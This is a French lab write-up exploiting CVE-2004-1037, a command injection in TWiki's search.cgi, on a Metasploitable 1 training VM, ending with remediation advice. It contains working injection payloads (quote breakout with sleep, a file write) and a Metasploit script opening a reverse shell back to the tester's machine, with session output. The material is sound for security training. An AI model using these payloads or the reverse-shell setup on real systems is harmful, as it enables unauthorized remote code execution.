# Write-up — TWiki 20030201 : RCE via search.cgi (Metasploitable 1, port 80)

Cible : `192.168.56.102` · CVE-2004-1037 · Résultat : shell `www-data` (via Metasploit).

> **Note réseau.** Je suis sur `vboxnet0` (cible `192.168.56.102`, Kali `192.168.56.1`). Côté
> coéquipier (réseau `172.28.128.x`), remplacer les IP en conséquence — démarche identique.

TikiWiki et TWiki coexistent sur le port 80 : deux applications **distinctes**, traitées
séparément (voir `tikiwiki.md` pour l'autre).

---

## 1. Recon — localiser TWiki et sa version

🖥 Kali :
```bash
for u in "twiki/" "twiki/bin/view" "twiki/bin/search" "twiki/TWikiHistory.html"; do
  curl -s -o /dev/null -w "/$u -> %{http_code}\n" "http://192.168.56.102/$u"
done
# /twiki/ -> 200   /twiki/bin/view -> 200   /twiki/bin/search -> 200   /twiki/TWikiHistory.html -> 200
```
TWiki est présent, et `bin/search` répond. Version (datée via `TWikiHistory.html`) :
```bash
curl -s "http://192.168.56.102/twiki/TWikiHistory.html" | grep -oE '[0-9]{2} [A-Z][a-z]{2} 20[0-9]{2}' | head -2
# 18 Jan 2003
```
→ Build **TWiki 20030201** (nommage TWiki = date de release).

## 2. Identifier la vulnérabilité (faille connue + CVE + mécanisme)

🖥 Kali :
```bash
searchsploit twiki
# TWiki 20030201 - 'search.pm' Remote Command E...  | cgi/webapps/642.pl
# TWiki - Search Function Arbitrary Command Exe...  | php/webapps/16894.rb
msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
# References: https://nvd.nist.gov/vuln/detail/CVE-2004-1037
```
→ **CVE-2004-1037**.

**Mécanisme.** Le script `search.cgi` de TWiki construit une commande shell à partir du
paramètre `search` fourni par l'utilisateur (recherche en texte brut dans les topics via
`grep`), sans l'échapper correctement. Un attaquant peut casser la chaîne de guillemets de la
commande construite et injecter ses propres métacaractères shell (`;`, `|`, `` ` ``) pour
exécuter des commandes arbitraires, avec les droits du serveur web.

## 3. Confirmation manuelle de l'injection (par mesure de délai)

🖥 Kali — la sortie des commandes n'est pas réaffichée directement dans la page HTML de
résultat de recherche (elle ne contient que `Number of topics: N`), donc on confirme
l'exécution par un **délai mesurable** (`sleep`) plutôt que par la sortie texte :
```bash
# recherche normale : ~0.13s
curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
  --data-urlencode "search=test"
# 0.126485s

# breakout simple-quote + sleep 5 (espace remplacé par ${IFS}, interdit dans ce contexte)
curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
  --data-urlencode 'search=a'\'';sleep${IFS}5;#'\'''
# 5.138759s
```
Le passage de 0.13s à 5.14s confirme l'exécution de la commande injectée.
⚠️ Testé aussi avec un breakout en double-quote (`search=a";sleep 5;#"`) : **échec** (retour en
0.15s) — seul le breakout en **simple quote** fonctionne ; la commande construite en interne
utilise des simple quotes autour de `$search`.

## 4. Tentative manuelle de shell direct — limite rencontrée

🖥 Kali — tentative d'écrire la sortie de `id` dans un fichier du webroot pour le relire en
HTTP (`id>/var/www/twiki/pwn.txt`), puis le récupérer :
```bash
curl -s -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
  --data-urlencode "search=a';id>/var/www/twiki/pwn.txt;#'"
curl -s "http://192.168.56.102/twiki/pwn.txt"
# -> 404 Not Found
```
**Échec** : soit le chemin `/var/www/twiki/` n'est pas le bon webroot/répertoire de travail du
processus CGI, soit les droits ne permettent pas l'écriture à cet endroit précis. Le mécanisme
d'exécution est confirmé (§3), mais reconstituer manuellement un reverse shell FIFO+nc comme
pour TikiWiki aurait demandé de deviner le bon chemin filesystem à l'aveugle (pas de
retour direct de commande dans la page web).

**Décision, conforme à la méthodologie du labo (manuel avant Metasploit, mais sans s'acharner)** :
passer au module dédié, qui gère déjà ces spécificités (écriture d'un fichier de test via
`tee`, vérification de sa présence via une requête `bin/view/Main/<fichier>`, avant de lancer
le payload réel).

## 5. Exploitation — module Metasploit

🖥 Kali — resource script (forme testée, évite les soucis de guillemets imbriqués) :
```bash
cat > /tmp/twiki.rc << 'EOF'
use exploit/unix/webapp/twiki_search
set RHOSTS 192.168.56.102
set RPORT 80
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.1
set LPORT 4445
exploit -z
sessions -l
sessions -i 1 -c id
sessions -i 1 -c whoami
sessions -i 1 -c "uname -a"
sessions -i 1 -c hostname
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/twiki.rc
```

Résultat :
```
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to delete: /twiki/bin/view/Main/ENi4OU0U
[+] The target is vulnerable. The target is vulnerable
[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.102:54515)
```

## 6. Preuve d'accès

```
sessions -i 1 -c id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

sessions -i 1 -c uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

sessions -i 1 -c hostname
metasploitable
```
→ Shell confirmé en tant que **`www-data`** sur `metasploitable`. Pas root : l'élévation de
privilèges sera une étape distincte.

---

## Remédiation

- Mettre à jour TWiki : le build 20030201 est très ancien, CVE-2004-1037 est corrigée dans
  les versions ultérieures qui échappent correctement les entrées dans `search.pm`.
- Ne jamais construire une commande shell en interpolant directement une entrée utilisateur ;
  utiliser des appels système avec arguments séparés (ex. `open(my $fh, '-|', 'grep', '-l',
  $pattern, @files)` plutôt qu'une chaîne shell concaténée).
- Appliquer le principe de moindre privilège au compte du serveur web (`www-data`), qui est
  déjà limité ici — mais reste un point de départ pour une élévation de privilèges.
- Restreindre ou désactiver la fonctionnalité de recherche si elle n'est pas indispensable, ou
  la placer derrière une authentification.

## Sources

- Session réelle (ce write-up) — recon, confirmation par délai, tentative manuelle, bascule
  Metasploit.
- `msfconsole -q -x "info exploit/unix/webapp/twiki_search"` → CVE-2004-1037 :
  https://nvd.nist.gov/vuln/detail/CVE-2004-1037
- PoC d'origine : Exploit-DB `cgi/webapps/642.pl` (RoMaNSoFt, 2004) — lu pour comprendre la
  construction exacte de la commande injectée (`searchsploit`).

**Suite du parcours MS1 :** Samba — énumération (port 139/445), avant l'exploitation
(CVE-2007-2447).
